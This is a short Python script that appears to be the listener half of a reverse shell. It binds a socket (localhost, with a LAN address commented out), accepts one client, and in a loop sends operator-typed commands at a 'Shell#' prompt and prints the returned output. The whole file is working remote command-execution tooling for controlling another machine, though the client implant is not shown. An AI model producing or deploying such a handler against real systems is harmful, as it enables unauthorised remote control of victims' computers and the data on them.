import socket

HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222

server = socket.socket()
server.bind((HOST, PORT))

print('[+] Server Started')
print('[+] Listening For Client Connection ...')

server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

# RELIABLE SEND
def send(data):
    try:
        data = data.encode()
    except AttributeError:
        pass
    client.send(data)

# RELIABLE RECIEVE
def recv():
    output = client.recv(16834)
    output = output.decode()
    return output

while True:
    command = input(f'+ Shell#~{client_addr}: ')
    send(command)
    print('[+] Command sent')

    result = recv()
    print(result)